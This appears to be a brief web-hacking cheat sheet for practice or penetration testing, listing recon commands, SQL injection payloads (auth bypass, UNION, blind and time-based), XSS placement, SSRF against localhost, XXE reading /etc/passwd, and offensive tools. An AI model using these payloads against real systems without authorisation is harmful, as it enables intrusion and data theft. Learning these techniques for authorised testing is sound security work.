# Web — Cheatsheet

## Recon
- curl -i URL  (headers)
- Browser devtools: Network + Application tabs
- ffuf -u URL/FUZZ -w wordlist.txt  (fuzz paths)
- Check robots.txt, sitemap.xml, .git/, backup files

## SQL injection
- `' OR 1=1 -- -`  (auth bypass)
- UNION: `' UNION SELECT 1,2,3 -- -`
- Blind boolean: `' AND (SELECT length(database())) = 4 -- -`
- Time-based: `' AND SLEEP(5) -- -`

## XSS
- reflected: an alert payload in a URL parameter
- stored: the payload persisted in an input field
- DOM: watch location.hash sinks

## SSRF / XXE
- SSRF: point a URL field at http://127.0.0.1/
- XXE: external entity to read a local file like /etc/passwd

## Tools
- Burp Suite, sqlmap, ffuf, jwt_tools
